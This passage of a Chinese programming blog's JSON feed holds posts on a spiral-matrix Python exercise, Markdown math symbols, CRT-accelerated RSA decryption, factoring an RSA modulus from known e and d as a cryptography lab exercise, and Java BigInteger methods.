class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>())</span><br><span class=\"line\">d = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>())</span><br><span class=\"line\"><span class=\"comment\"># d*d列表</span></span><br><span class=\"line\">a = [[<span class=\"number\">0</span>]*d <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(d)]</span><br><span class=\"line\"><span class=\"comment\"># 填充方向</span></span><br><span class=\"line\">direct = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\"># 当前填充坐标</span></span><br><span class=\"line\">x = <span class=\"number\">0</span></span><br><span class=\"line\">y = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(d*d):</span><br><span class=\"line\">    a[x][y] = i % n+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> direct == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> y+<span class=\"number\">1</span> &lt; d <span class=\"keyword\">and</span> a[x][y+<span class=\"number\">1</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">            y += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            x += <span class=\"number\">1</span></span><br><span class=\"line\">            direct = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> direct == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> x+<span class=\"number\">1</span> &lt; d <span class=\"keyword\">and</span> a[x+<span class=\"number\">1</span>][y] == <span class=\"number\">0</span>:</span><br><span class=\"line\">            x += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            y -= <span class=\"number\">1</span></span><br><span class=\"line\">            direct = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> direct == <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a[x][y-<span class=\"number\">1</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">            y -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            x -= <span class=\"number\">1</span></span><br><span class=\"line\">            direct = <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a[x-<span class=\"number\">1</span>][y] == <span class=\"number\">0</span>:</span><br><span class=\"line\">            x -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            y += <span class=\"number\">1</span></span><br><span class=\"line\">            direct = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    s = [<span class=\"built_in\">str</span>(j) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot; &quot;</span>.join(s))</span><br></pre></td></tr></table></figure>\n<p>这题总算过了。</p>\n",
            "tags": [
                "Python"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/markdown-formula-symbol/",
            "url": "https://blog.meancoder.xyz/2020/markdown-formula-symbol/",
            "title": "Markdown 公式符号",
            "date_published": "2020-06-03T14:12:31.000Z",
            "content_html": "<p>记录一下部分 Markdown 公式中符号的代码。（本文将持续更新）</p>\n<!---more--->\n<table>\n<thead>\n<tr class=\"header\">\n<th>符号名称</th>\n<th>显示效果</th>\n<th>代码</th>\n</tr>\n</thead>\n<tbody>\n<tr class=\"odd\">\n<td>小于等于号</td>\n<td><span class=\"math inline\">≤</span></td>\n<td><code>\\leqslant</code></td>\n</tr>\n<tr class=\"even\">\n<td>大于等于号</td>\n<td><span class=\"math inline\">≥</span></td>\n<td><code>\\geqslant</code></td>\n</tr>\n<tr class=\"odd\">\n<td>根号</td>\n<td><span class=\"math inline\">$\\sqrt{2}$</span></td>\n<td><code>\\sqrt&#123;2&#125;</code></td>\n</tr>\n<tr class=\"even\">\n<td>根号</td>\n<td><span class=\"math inline\">$\\sqrt[n]{2}$</span></td>\n<td><code>\\sqrt[n]&#123;2&#125;</code></td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "Markdown"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/MMRC/",
            "url": "https://blog.meancoder.xyz/2020/MMRC/",
            "title": "改进的混合基数转换法（MMRC）",
            "date_published": "2020-05-19T01:56:28.000Z",
            "content_html": "<p>混合基数转换法（Mixed-Radix Conversion, MRC）是求 CRT\n唯一解的方法，Kunth\n对其进行了改进。可将改算法改进为改进的混合基数转换法（Modified\nMixed-Radix Conversion, MMRC）。</p>\n<span id=\"more\"></span>\n<p>MRC 比较复杂，在这里不做介绍，可以参考<a\nhref=\"http://www.cnki.com.cn/Article/CJFDTotal-HBKX200303003.htm\">《中国剩余定理在\nRSA 解密中的应用》</a><a href=\"#fn1\" class=\"footnote-ref\" id=\"fnref1\"\nrole=\"doc-noteref\"><sup>1</sup></a>。</p>\n<h2 id=\"mmrc\">MMRC</h2>\n<p>下面来介绍一下 MMRC：</p>\n<p>设同余方程组为：</p>\n<p><span class=\"math display\">$$\n\\begin{cases}\nx≡d_1\\pmod{p_1}\\\\\nx≡d_2\\pmod{p_2}\\\\\n......\\\\\nx≡d_s\\pmod{p_s}\\\\\n\\end{cases}\n$$</span></p>\n<ol type=\"1\">\n<li>计算<span\nclass=\"math inline\"><em>B</em><sub><em>j</em><em>i</em></sub> ← <em>p</em><sub><em>j</em></sub><sup>−1</sup> (mod  <em>p</em><sub><em>i</em></sub>)(1≤<em>j</em>&lt;<em>i</em>≤<em>s</em>)</span>；</li>\n<li>令<span\nclass=\"math inline\"><em>a</em><sub><em>i</em>1</sub> = <em>d</em><sub><em>i</em></sub>(1≤<em>i</em>≤<em>s</em>)</span>，由递推公式<span\nclass=\"math inline\"><em>a</em><sub><em>i</em>(<em>j</em>+1)</sub> = (<em>a</em><sub><em>i</em><em>j</em></sub>−<em>a</em><sub><em>j</em><em>j</em></sub>)<em>B</em><sub><em>j</em><em>i</em></sub> mod  <em>p</em><sub><em>i</em></sub>(1≤<em>j</em>&lt;<em>i</em>≤<em>s</em>)</span>，计算<span\nclass=\"math inline\"><em>a</em><sub>11</sub>, <em>a</em><sub>22</sub>, ..., <em>a</em><sub><em>s</em><em>s</em></sub></span>;</li>\n<li>计算唯一解<span\nclass=\"math inline\"><em>x</em> ← <em>a</em><sub>11</sub> + <em>a</em><sub>22</sub><em>p</em><sub>1</sub> + <em>a</em><sub>33</sub><em>p</em><sub>1</sub><em>p</em><sub>2</sub> + ... + <em>a</em><sub><em>s</em><em>s</em></sub><em>p</em><sub>1</sub><em>p</em><sub>2</sub><em>p</em><sub>3</sub>...<em>p</em><sub><em>s</em></sub></span>。</li>\n</ol>\n<p>特别地，对于只包含两个方程的方程组</p>\n<p><span class=\"math display\">$$\n\\begin{cases}\nx≡d_1\\pmod{p_1}\\\\\nx≡d_2\\pmod{p_2}\\\\\n\\end{cases}\n$$</span></p>\n<p>可以这样计算：</p>\n<ol type=\"1\">\n<li>计算<span\nclass=\"math inline\"><em>B</em><sub>12</sub> ← <em>p</em><sub>1</sub><sup>−1</sup> (mod  <em>p</em><sub>2</sub>)</span>；</li>\n<li><span\nclass=\"math inline\"><em>a</em><sub>11</sub> = <em>d</em><sub>1</sub></span>，<span\nclass=\"math inline\"><em>a</em><sub>21</sub> = <em>d</em><sub>2</sub></span>，计算<span\nclass=\"math inline\"><em>a</em><sub>22</sub> = (<em>a</em><sub>21</sub>−<em>a</em><sub>11</sub>)<em>B</em><sub>12</sub> mod  <em>p</em><sub>2</sub></span>;</li>\n<li>计算唯一解<span\nclass=\"math inline\"><em>x</em> ← <em>a</em><sub>11</sub> + <em>a</em><sub>22</sub><em>p</em><sub>1</sub></span>。</li>\n</ol>\n<h2 id=\"mmrc-在-rsa-解密中的作用\">MMRC 在 RSA 解密中的作用</h2>\n<p>RSA 的解密过程为<span\nclass=\"math inline\"><em>M</em> = <em>C</em><sup><em>d</em></sup> mod  <em>N</em></span>，而<span\nclass=\"math inline\"><em>N</em> = <em>p</em><em>q</em></span>且<span\nclass=\"math inline\"><em>p</em></span>和<span\nclass=\"math inline\"><em>q</em></span>互素，所以 M 可以通过下式求出：</p>\n<p><span class=\"math display\">$$\n\\begin{cases}\nm_1≡C^d\\pmod p\\\\\nm_2≡C^d\\pmod q\\\\\n\\end{cases}\n$$</span></p>\n<p>其中<span\nclass=\"math inline\"><em>m</em><sub>1</sub> = <em>C</em><sup><em>d</em></sup> mod  <em>p</em></span>，<span\nclass=\"math inline\"><em>m</em><sub>2</sub> = <em>C</em><sup><em>d</em></sup> mod  <em>q</em></span>。</p>\n<p>由此我们可以得到快速解密的算法：</p>\n<ol type=\"1\">\n<li>计算<span\nclass=\"math inline\"><em>m</em><sub>1</sub> ← (<em>C</em> mod  <em>p</em>)<sup><em>d</em> mod  <em>p</em> − 1</sup> mod  <em>p</em></span>，<span\nclass=\"math inline\"><em>m</em><sub>2</sub> ← (<em>C</em> mod  <em>q</em>)<sup><em>d</em> mod  <em>q</em> − 1</sup> mod  <em>q</em></span>；</li>\n<li>计算<span\nclass=\"math inline\"><em>p</em><sup>−1</sup> (mod  <em>q</em>)</span>；</li>\n<li>计算<span\nclass=\"math inline\"><em>t</em> ← <em>p</em><sup>−1</sup>(<em>m</em><sub>2</sub>−<em>m</em><sub>1</sub>) mod  <em>q</em></span>；</li>\n<li>计算明文<span\nclass=\"math inline\"><em>M</em> ← <em>m</em><sub>1</sub> + <em>t</em><em>p</em></span>。</li>\n</ol>\n<p>在第 1 步中，由于<span\nclass=\"math inline\"><em>p</em></span>是素数，由费马小定理<a href=\"#fn2\"\nclass=\"footnote-ref\" id=\"fnref2\"\nrole=\"doc-noteref\"><sup>2</sup></a>可得，<span\nclass=\"math inline\"><em>C</em><sup><em>p</em> − 1</sup> ≡ 1 (mod  <em>p</em>)</span>，所以<span\nclass=\"math inline\">(<em>C</em> mod  <em>p</em>)<sup><em>d</em> mod  <em>p</em> − 1</sup> mod  <em>p</em> = <em>C</em><sup><em>d</em></sup> mod  <em>p</em></span>，<span\nclass=\"math inline\"><em>m</em><sub>2</sub></span>同理。</p>\n<p>下面给出我的代码，完整代码见<a\nhref=\"https://github.com/MeanZhang/RSA\">MeanZhang/RSA:\nRSA-Java</a>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * RSA解密</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用了MMRC算法</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> c 密文</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> d 私钥d</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> p p</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> q q</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> 明文</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> BigInteger <span class=\"title function_\">decrypt</span><span class=\"params\">(BigInteger c, BigInteger d, BigInteger p, BigInteger q)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// m1 ≡ c^d ≡ (c mod p)^(d mod (p-1))(mod p)</span></span><br><span class=\"line\">    <span class=\"type\">BigInteger</span> <span class=\"variable\">m1</span> <span class=\"operator\">=</span> c.mod(p).modPow(d.mod(p.subtract(BigInteger.ONE)), p);</span><br><span class=\"line\">    <span class=\"comment\">// m2 ≡ c^d ≡ (c mod q)^(d mod (q-1))(mod q)</span></span><br><span class=\"line\">    <span class=\"type\">BigInteger</span> <span class=\"variable\">m2</span> <span class=\"operator\">=</span> c.mod(q).modPow(d.mod(q.subtract(BigInteger.ONE)), q);</span><br><span class=\"line\">    <span class=\"type\">BigInteger</span> <span class=\"variable\">invP</span> <span class=\"operator\">=</span> p.modInverse(q);</span><br><span class=\"line\">    <span class=\"comment\">// t = p^(-1) * (m2-m1) mod q</span></span><br><span class=\"line\">    <span class=\"type\">BigInteger</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> invP.multiply(m2.subtract(m1)).mod(q);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m1.add(t.multiply(p));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考资料\">参考资料</h2>\n<aside id=\"footnotes\" class=\"footnotes footnotes-end-of-document\"\nrole=\"doc-endnotes\">\n<hr />\n<ol>\n<li id=\"fn1\"><p><a\nhref=\"http://www.cnki.com.cn/Article/CJFDTotal-HBKX200303003.htm\">中国剩余定理在\nRSA 解密中的应用–《河北省科学院学报》2003 年 03 期</a><a href=\"#fnref1\"\nclass=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\n<li id=\"fn2\"><p><a\nhref=\"https://zh.wikipedia.org/wiki/费马小定理\">费马小定理 -\n维基百科，自由的百科全书</a><a href=\"#fnref2\" class=\"footnote-back\"\nrole=\"doc-backlink\">↩︎</a></p></li>\n</ol>\n</aside>\n",
            "tags": [
                "密码学",
                "RSA",
                "抽象代数",
                "中国剩余定理"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/RSA-given-e-d-n-factorize-n/",
            "url": "https://blog.meancoder.xyz/2020/RSA-given-e-d-n-factorize-n/",
            "title": "RSA 已知 e，d 和 n，分解 N",
            "date_published": "2020-05-18T14:07:38.000Z",
            "content_html": "<p>这次的密码学实验有一个已知 <span\nclass=\"math inline\"><em>e</em></span> ， <span\nclass=\"math inline\"><em>d</em></span> 和 <span\nclass=\"math inline\"><em>N</em></span> ，分解 <span\nclass=\"math inline\"><em>N</em></span>\n的问题，想了很久（其实没想多久，试了一下就放弃了），然后就到网上找资料。找到了一个很好用的网站，<a\nhref=\"https://www.di-mgt.com.au/index.html\">DI Management\nHome</a>，都是关于密码学的，里面就有关于这个问题的算法<a href=\"#fn1\"\nclass=\"footnote-ref\" id=\"fnref1\"\nrole=\"doc-noteref\"><sup>1</sup></a>。</p>\n<span id=\"more\"></span>\n<blockquote>\n<p>Initially we compute <span\nclass=\"math inline\"><em>k</em> = <em>d</em><em>e</em> − 1</span> . We\nthen choose a random integer <span class=\"math inline\"><em>g</em></span>\nin the range <span\nclass=\"math inline\">1 &lt; <em>g</em> &lt; <em>N</em></span> . Now <span\nclass=\"math inline\"><em>k</em></span> is an even number, where <span\nclass=\"math inline\"><em>k</em> = 2<sup><em>t</em></sup><em>r</em></span>\nwith <span class=\"math inline\"><em>r</em></span> odd and <span\nclass=\"math inline\"><em>t</em> ≥ 1</span> , so we can compute <span\nclass=\"math inline\"><em>x</em> = <em>g</em><sup><em>k</em>/2</sup>, <em>g</em><sup><em>k</em>/4</sup>, …, <em>g</em><sup><em>k</em>/2<sup><em>t</em></sup></sup> (mod  <em>N</em>)</span>\nuntil <span class=\"math inline\"><em>x</em> &gt; 1</span> and <span\nclass=\"math inline\"><em>y</em> = gcd (<em>x</em>−1,<em>N</em>) &gt; 1</span>\n. If so, then one of our factors, say <span\nclass=\"math inline\"><em>p</em></span> , is equal to <span\nclass=\"math inline\"><em>y</em></span> , and the other is <span\nclass=\"math inline\"><em>q</em> = <em>N</em>/<em>y</em></span> and we are\ndone. If we don’t find a solution, then we choose another random <span\nclass=\"math inline\"><em>g</em></span> .</p>\n<p>DI Management - <em><a\nhref=\"https://www.di-mgt.com.au/rsa_factorize_n.html\">RSA: how to\nfactorize N given d</a></em></p>\n</blockquote>\n<p>简单翻译一下：</p>\n<blockquote>\n<p>首先我们计算 <span\nclass=\"math inline\"><em>k</em> = <em>d</em><em>e</em> − 1</span>\n。然后选择一个随机数 <span class=\"math inline\"><em>g</em></span> ，满足\n<span class=\"math inline\">1 &lt; <em>g</em> &lt; <em>N</em></span> 。\n<span class=\"math inline\"><em>k</em></span> 是偶数，所以 <span\nclass=\"math inline\"><em>k</em> = 2<sup><em>t</em></sup><em>r</em></span>\n，其中 <span class=\"math inline\"><em>r</em></span> 是奇数且 <span\nclass=\"math inline\"><em>t</em> ≥ 1</span> ，然后计算 <span\nclass=\"math inline\"><em>x</em> = <em>g</em><sup><em>k</em>/2</sup>, <em>g</em><sup><em>k</em>/4</sup>, …, <em>g</em><sup><em>k</em>/2<sup><em>t</em></sup></sup> (mod  <em>N</em>)</span>，直到\n<span class=\"math inline\"><em>x</em> &gt; 1</span> 且 <span\nclass=\"math inline\"><em>y</em> = gcd (<em>x</em>−1,<em>N</em>) &gt; 1</span>\n。 如果这样的 <span class=\"math inline\"><em>y</em></span>\n存在，那么其中一个因子 <span class=\"math inline\"><em>p</em></span> 等于\n<span class=\"math inline\"><em>y</em></span> ，并且 <span\nclass=\"math inline\"><em>q</em> = <em>N</em>/<em>y</em></span>\n，这样就完成了。如果这样的 <span class=\"math inline\"><em>y</em></span>\n不存在，就重新生成随机数 <span class=\"math inline\"><em>g</em></span>\n。</p>\n</blockquote>\n<p>下面是我的代码，对原算法稍微进行了一点改动。原算法是先计算出 <span\nclass=\"math inline\"><em>t</em></span> 和 <span\nclass=\"math inline\"><em>r</em></span> ，然后依次计算 <span\nclass=\"math inline\"><em>x</em> = <em>g</em><sup><em>k</em>/2<sup><em>i</em></sup></sup></span>\n。这里我不计算 <span class=\"math inline\"><em>t</em></span> 和 <span\nclass=\"math inline\"><em>r</em></span> ，而是只要 <span\nclass=\"math inline\"><em>k</em></span> 是偶数，就将其除以 2，然后计算\n<span\nclass=\"math inline\"><em>x</em> = <em>g</em><sup><em>k</em></sup></span>\n并判断是否满足条件。这样可以减少一些计算，但是由于 <span\nclass=\"math inline\"><em>t</em></span> 并不大，所以减少的计算有限。</p>\n<p>完整代码见<a href=\"https://github.com/MeanZhang/RSA\">MeanZhang/RSA:\nRSA-Java</a>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 已知e，d，n，分解n</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> e 公钥e</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> d 私钥d</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> n 模数n</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> p，q</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> BigInteger[] attack(BigInteger e, BigInteger d, BigInteger n) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// p,q</span></span><br><span class=\"line\">    BigInteger[] result = <span class=\"keyword\">new</span> <span class=\"title class_\">BigInteger</span>[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"comment\">// k=de-1</span></span><br><span class=\"line\">    <span class=\"type\">BigInteger</span> <span class=\"variable\">k</span> <span class=\"operator\">=</span> d.multiply(e).subtract(BigInteger.ONE);</span><br><span class=\"line\">    <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">BigInteger</span> <span class=\"variable\">g</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BigInteger</span>(n.bitLength(), random);</span><br><span class=\"line\">        <span class=\"comment\">// 选择随机数g，1&lt;g&lt;n</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (g.compareTo(BigInteger.ONE) &lt;= <span class=\"number\">0</span> || g.compareTo(n) &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">            g = <span class=\"keyword\">new</span> <span class=\"title class_\">BigInteger</span>(n.bitLength(), random);</span><br><span class=\"line\">        <span class=\"type\">BigInteger</span> <span class=\"variable\">k1</span> <span class=\"operator\">=</span> k;</span><br><span class=\"line\">        <span class=\"comment\">// 计算t和g^(k/2^i)的过程合在一起</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (k1.mod(BigInteger.TWO).equals(BigInteger.ZERO)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 如果k为偶数，就除以2</span></span><br><span class=\"line\">            k1 = k1.shiftRight(<span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 此时g^(k/2^i)=g^k1</span></span><br><span class=\"line\">            <span class=\"type\">BigInteger</span> <span class=\"variable\">x</span> <span class=\"operator\">=</span> g.modPow(k1, n);</span><br><span class=\"line\">            <span class=\"comment\">// 计算y=gcd(x−1,n)，直接赋值给p(result[0])</span></span><br><span class=\"line\">            result[<span class=\"number\">0</span>] = x.subtract(BigInteger.ONE).gcd(n);</span><br><span class=\"line\">            <span class=\"comment\">// 如果x&gt;1且y=gcd(x−1,n)&gt;1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (x.compareTo(BigInteger.ONE) &gt; <span class=\"number\">0</span> &amp;&amp; result[<span class=\"number\">0</span>].compareTo(BigInteger.ONE) &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                result[<span class=\"number\">1</span>] = n.divide(result[<span class=\"number\">0</span>]);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试数据：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e:</span><br><span class=\"line\">65537</span><br><span class=\"line\">d:</span><br><span class=\"line\">13085102850405329895940153649208766646679432053055210927814587187939575969334380946175257120108607885616731724467899991987963542311668962802613624160423864736904359544115910805381019345850330276964971412664144174157825068713331109139842487999112829255389047329358923488846912437792391102853729375052922599258215311601018992134762683570752403675370812499995354701024990414541327012769030147878934713424171374951602988478984432403148854042370903764361797455965930292322795814453835335323397068237664481359506461188857661605832041501219728374514303209642746672993156029099655958158717907546664548938973389857200804582177</span><br><span class=\"line\">n:</span><br><span class=\"line\">21378032245774894186324720788457768851857953294637267751313371903474996018902810092972224806315945430514626988743400353365786674788848003569698586194388463460699531620948408197942261177369324808332585418351947368544183614904162658914539989430070735676083960582943505227316151479174351490943931346982185481068889458087344890907035731467000101100009111593455801160870652558847164438348031498067369123608755518383163346962891967964682970251625764813457371461595048927486942272152822570449609158417324070867001419543608370026546341531367233199832189762919523227554947408242727690461831545997600374969434706782376320559561</span><br><span class=\"line\">p:</span><br><span class=\"line\">134015724574231629415725856596339106132655429815809390083191653420751276014515665041469448212111089978027787330894345961709429696830117657137052704491606694791519141111894965847240833879740293408266251425861598011543042632576624378597158795956174622709934079034648552634466265913328434606944071200422868130573</span><br><span class=\"line\">q:</span><br><span class=\"line\">159518834925475861956097917917341301031640418209579419960447972340833353891477422457476074816300423813142613130845835933143395284444599641612757310435466623981281701817688676270876235464147642571713805328342460087461430626730047957682558277868352127107752854583156354513612089006699159193484825862868615965357</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考资料\">参考资料</h2>\n<aside id=\"footnotes\" class=\"footnotes footnotes-end-of-document\"\nrole=\"doc-endnotes\">\n<hr />\n<ol>\n<li id=\"fn1\"><p><a\nhref=\"https://www.di-mgt.com.au/rsa_factorize_n.html\">RSA: how to\nfactorize N given d</a><a href=\"#fnref1\" class=\"footnote-back\"\nrole=\"doc-backlink\">↩︎</a></p></li>\n</ol>\n</aside>\n",
            "tags": [
                "密码学",
                "RSA",
                "抽象代数"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/biginteger-usage/",
            "url": "https://blog.meancoder.xyz/2020/biginteger-usage/",
            "title": "BigInteger 用法",
            "date_published": "2020-05-16T13:36:22.000Z",
            "content_html": "<p>今天在写 RSA，又用到了<code>java.math.BigInteger</code>类<a\nhref=\"#fn1\" class=\"footnote-ref\" id=\"fnref1\"\nrole=\"doc-noteref\"><sup>1</sup></a>，总结一下常用的用法。（写完才发现\ngcd 和求逆方法都有了）</p>\n<span id=\"more\"></span>\n<h2 id=\"biginteger-介绍\">BigInteger 介绍</h2>\n<p>继承自<code>Number</code>类，可表示任意长度的整数。<code>BigInteger</code>用等号可以直接进行复制，而不是引用地址。</p>\n<h2 id=\"构造方法\">构造方法</h2>\n<ul>\n<li><p><code>public BigInteger(int numBits, Random rnd)</code></p>\n<p>构造一个随机生成的<code>numBits</code>位的<code>BigInteger</code>。</p></li>\n<li><p><code>public BigInteger(String val)</code></p>\n<p>将十进制字符串表示的<code>val</code>转为<code>BigInteger</code>。</p></li>\n<li><p><code>public BigInteger(String val, int radix)</code></p>\n<p>将<code>radix</code>进制字符串表示的<code>val</code>转为<code>BigInteger</code>。</p></li>\n</ul>\n<h2 id=\"常用方法\">常用方法</h2>\n<ul>\n<li><p><code>public BigInteger add(BigInteger val)</code></p>\n<p>加法。</p></li>\n<li><p><code>public BigInteger subtract(BigInteger val)</code></p>\n<p>减法。</p></li>\n<li><p><code>public BigInteger multiply(BigInteger val)</code></p>\n<p>乘法。</p></li>\n<li><p><code>public BigInteger divide(BigInteger val)</code></p>\n<p>除法。</p></li>\n<li><p><code>public BigInteger[] divideAndRemainder(BigInteger val)</code></p>\n<p>带余除法，返回商和余数。</p></li>\n<li><p><code>public BigInteger remainder(BigInteger val)</code></p>\n<p>求余数。</p></li>\n<li><p><code>public BigInteger mod(BigInteger m)</code></p>\n<p>取模，注意和取余的区别。</p></li>\n<li><p><code>public BigInteger pow(int exponent)</code></p>\n<p>幂运算。</p></li>\n<li><p><code>public BigInteger gcd(BigInteger val)</code></p>\n<p>求最大公因子。</p></li>\n<li><p><code>public BigInteger abs()</code></p>\n<p>取绝对值。</p></li>\n<li><p><code>public BigInteger negate()</code></p>\n<p>取相反数。</p></li>\n<li><p><code>public BigInteger modPow(BigInteger exponent, BigInteger m)</code></p>\n<p>模幂。</p></li>\n<li><p><code>public BigInteger modInverse(BigInteger m)</code></p>\n<p>求逆元。</p></li>\n<li><p><code>public BigInteger shiftLeft(int n)</code></p>\n<p>左移<code>n</code>位。</p></li>\n<li><p><code>public BigInteger shiftRight(int n)</code></p>\n<p>右移<code>n</code>位。</p></li>\n<li><p><code>public int bitLength()</code></p>\n<p>返回二进制位数，不包括符号位。</p></li>\n<li><p><code>public static BigInteger valueOf(long val)</code></p>\n<p>返回一个值为<code>val</code>的<code>BigInteger</code>。</p></li>\n<li><p><code>public static BigInteger probablePrime(int bitLength, Random rnd)</code></p>\n<p>返回一个<code>bitLength</code>位的可能是素数的<code>BigInteger</code>。</p></li>\n<li><p><code>public boolean isProbablePrime(int 